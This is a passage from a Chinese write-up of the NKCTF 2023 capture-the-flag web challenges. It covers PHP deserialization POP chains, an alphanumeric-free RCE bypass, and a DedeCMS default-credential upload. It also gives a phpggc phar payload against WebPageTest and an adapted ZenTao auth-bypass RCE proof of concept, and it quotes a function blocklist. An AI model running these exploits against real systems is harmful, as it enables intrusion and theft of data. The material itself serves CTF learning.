src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/decompile_revenge-1.png"></p><p><code>NKCTF&#123;This_1s_Decompile_Rev3nge!!!!&#125;</code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h2><p>反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;oww!man!!&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;ItS SO CREAZY&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name == <span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;arg;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="hljs-variable">$string</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you are bad&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$shell</span> = <span class="hljs-variable language_">$this</span>-&gt;shell;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable language_">$this</span>-&gt;cmd;<br>            <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>            <span class="hljs-variable">$function</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最终需要在Happy类中执行eval，<code>__invoke</code>在将对象当作函数来使用时调用此方法，在<code>Hell0</code>类中可以调用函数<code>$function()</code>以触发<code>__invoke</code>，而调用函数需要触发<code>__toString</code>方法，而在<code>Welcome</code>类中存在<code>echo</code>，可以触发<code>__toString</code></p><p>反序列化后会有一个waf方法来检查<code>$cmd</code>中的值是否存在<code>f</code>,<code>l</code>,<code>a</code>,<code>g</code>,<code>*</code>,<code>?</code></p><p>列目录：<code>dir /</code></p><p><code>O:7:&quot;Welcome&quot;:2:&#123;s:4:&quot;name&quot;;s:16:&quot;welcome_to_NKCTF&quot;;s:3:&quot;arg&quot;;O:5:&quot;Hell0&quot;:1:&#123;s:4:&quot;func&quot;;O:5:&quot;Happy&quot;:2:&#123;s:5:&quot;shell&quot;;s:6:&quot;system&quot;;s:3:&quot;cmd&quot;;s:5:&quot;dir /&quot;;&#125;&#125;&#125;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_php-1.png"></p><p>读<code>/f1ag</code>：使用<code>gzdecode</code>编码绕过</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//$cmd=&#x27;system(&quot;more /*&quot;);&#x27;;</span><br><span class="hljs-comment">//echo urlencode(gzencode($cmd));</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;Hell0&#x27;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>=<span class="hljs-string">&#x27;gzdecode&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&#x27;Happy&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Welcome</span>();<br><span class="hljs-variable">$a</span>-&gt;arg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hell0</span>();<br><span class="hljs-variable">$a</span>-&gt;arg-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Happy</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>O%3A7%3A%22Welcome%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A16%3A%22welcome_to_NKCTF%22%3Bs%3A3%3A%22arg%22%3BO%3A5%3A%22Hell0%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A5%3A%22shell%22%3Bs%3A8%3A%22gzdecode%22%3Bs%3A3%3A%22cmd%22%3Bs%3A38%3A%22%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00%22%3B%7D%7D%7D</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_php-2.png"></p><h2 id="eazy-php"><a href="#eazy-php" class="headerlink" title="eazy_php"></a>eazy_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>] != (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>] != <span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>]) == <span class="hljs-number">114514</span>)&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NS_CTF.go&#x27;</span>]))&#123;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>                        &#125;<span class="hljs-keyword">else</span>&#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!!&#x27;</span>);<br>                        &#125;<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!&#x27;</span>);<br>                    &#125;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!&#x27;</span>);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!&#x27;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!&#x27;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!&#x27;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第一层md5弱比较，使用数组绕过<br><code>a[]=1&amp;b[]=2</code></p><p>第二层sha1强比较<br><code>c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</code></p><p>第三层数字比较缺陷，使用小数类型<br><code>e=114514.20</code></p><p>第四层php变量值特性，使用<code>[</code>代替<code>_</code><br><code>NS[CTF.go</code></p><p>第五层无字母数字rce，使用取反<br><code>cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);</code></p><h2 id="easy-cms"><a href="#easy-cms" class="headerlink" title="easy_cms"></a>easy_cms</h2><p>访问后台<code>/dede/</code>，用户名<code>admin</code>，密码<code>admin</code></p><p>左侧核心栏中有个文件式管理器，可以上传文件</p><p>存在过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不允许这些字符</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#(/\*)[\s\S]*(\*/)#i&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$content</span>);<br><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$cfg_disable_funs</span>;<br><span class="hljs-variable">$cfg_disable_funs</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$cfg_disable_funs</span>) ? <span class="hljs-variable">$cfg_disable_funs</span> : <span class="hljs-string">&#x27;phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,file_get_contents,highlight_file,fsockopen,fopen,fwrite,preg_replace&#x27;</span>;<br><span class="hljs-variable">$cfg_disable_funs</span> = <span class="hljs-variable">$cfg_disable_funs</span>.<span class="hljs-string">&#x27;,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert&#x27;</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$cfg_disable_funs</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$value</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$value</span>) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[^a-z]+[&#x27;\&quot;]*<span class="hljs-subst">&#123;$value&#125;</span>[&#x27;\&quot;]*[\s]*[([&#123;]#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#^[\s\S]+&lt;\?(php|=)?[\s]+#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[`][\s\S]*[`]#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用<code>scandir</code>列目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用<code>include</code>读文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/f1Aggg&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_cms-1.png"></p><h2 id="webpagetest"><a href="#webpagetest" class="headerlink" title="webpagetest"></a>webpagetest</h2><p>webpagetest反序列化</p><p><a href="https://xz.aliyun.com/t/11798">AVD-2022-1474319</a></p><p>借助<code>phpggc</code>生成执行<code>cat /flag</code>命令的<code>phar</code>文件并发送</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">./phpggc Monolog/RCE2 system &#x27;cat /flag&#x27; -p phar -o testinfo.ini<br><br>URLENC_PAYLOAD=$(cat /root/phpggc/testinfo.ini | xxd -p | tr -d &quot;\n&quot; | sed &quot;s#..#%&amp;#g&quot;)<br><br>curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=gadget&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -<br><br>curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=phar:///var/www/html/results/gadget./testinfo.ini/foo&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/webpagetest-1.png"></p><h2 id="easy-pms"><a href="#easy-pms" class="headerlink" title="easy_pms"></a>easy_pms</h2><p>右键查看网页源代码得到版本为<code>18.0.beta1</code></p><p>github搜到<a href="https://github.com/webraybtl/zentaopms_poc/blob/main/poc_bypass_rce.py">poc</a></p><p>修改一下，加个回显，用<code>curl</code>外带到第三方平台<br><code>/flag</code>太长用<code>grep+base64</code>筛选</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-comment"># !/usr/bin/python</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">权限绕过+RCE POC 伪静态传参版</span><br><span class="hljs-string">禅道系统 影响版本 安全版本</span><br><span class="hljs-string">开源版 17.4以下的未知版本&lt;=version&lt;=18.0.beta1 18.0.beta2</span><br><span class="hljs-string">旗舰版 3.4以下的未知版本&lt;=version&lt;=4.0.beta1 4.0.beta2</span><br><span class="hljs-string">企业版 7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta2</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> requests<br><br>proxies = &#123;<br>    <span class="hljs-comment">#&quot;http&quot;: &quot;127.0.0.1:8080&quot;,</span><br>    <span class="hljs-comment">#&quot;https&quot;: &quot;127.0.0.1:8080&quot;,</span><br>&#125;<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-comment"># url=&quot;http://10.211.55.3:8008&quot;</span><br>    url1 = url+<span class="hljs-string">&#x27;/misc-captcha-user.html&#x27;</span><br>    <span class="hljs-comment"># url1 = url+&#x27;/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;#非伪静态版本按照此格式传参</span><br>    <span class="hljs-comment"># url2 = url+&#x27;/index.php?m=block&amp;f=printBlock&amp;id=1&amp;module=my&#x27;#可判断验证绕过的链接</span><br>    url3 = url + <span class="hljs-string">&#x27;repo-create.html&#x27;</span><br>    url4 = url + <span class="hljs-string">&#x27;repo-edit-10000-10000.html&#x27;</span><br>    headers=&#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>:<span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,<br>    &#125;<br><br>    headers2 = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,<br>        <span 